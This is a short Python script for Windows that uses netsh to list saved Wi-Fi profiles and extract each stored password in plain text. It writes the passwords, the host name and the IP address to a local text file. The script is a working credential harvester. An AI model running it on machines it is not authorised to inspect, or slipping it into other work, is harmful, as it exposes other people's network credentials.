import os
import socket
import subprocess

networks = ""
cmd = "netsh wlan show profile"

networks = subprocess.check_output(cmd, shell=True, text=True)

f = open("networks.txt", "w")
f.write(networks)
f.close()

networks = []

f = open("networks.txt", "r")
lines = f.readlines()
for line in lines:
    line = line.strip()
    if line[:23] == "All User Profile     : ":
        networks.append(line[23:])
f.close()

os.remove("networks.txt")
networkInfo = ""

with open("Final Network List.txt", "w") as f:
    hostname = socket.gethostname()   
    ipaddress = socket.gethostbyname(hostname)
    f.write("Computer Name: " + hostname + "\n" + "IP Address: " + ipaddress + "\n")
    for network in networks:
        try:
            cmd_alt = f'netsh wlan show profile name="{network}" key=clear'
            networkInfo = subprocess.check_output(cmd_alt, shell=True, text=True)
            location = networkInfo.find("Key Content            : ")
            networkInfo = networkInfo[location:]
            location2 = networkInfo.find("\n")
            key = networkInfo[25:location2]
            if key == "":
                key = "PASSWORD NOT FOUND"
            f.write("Network Name: "+ network + "; Password: " + key + "\n")
        except:
            pass
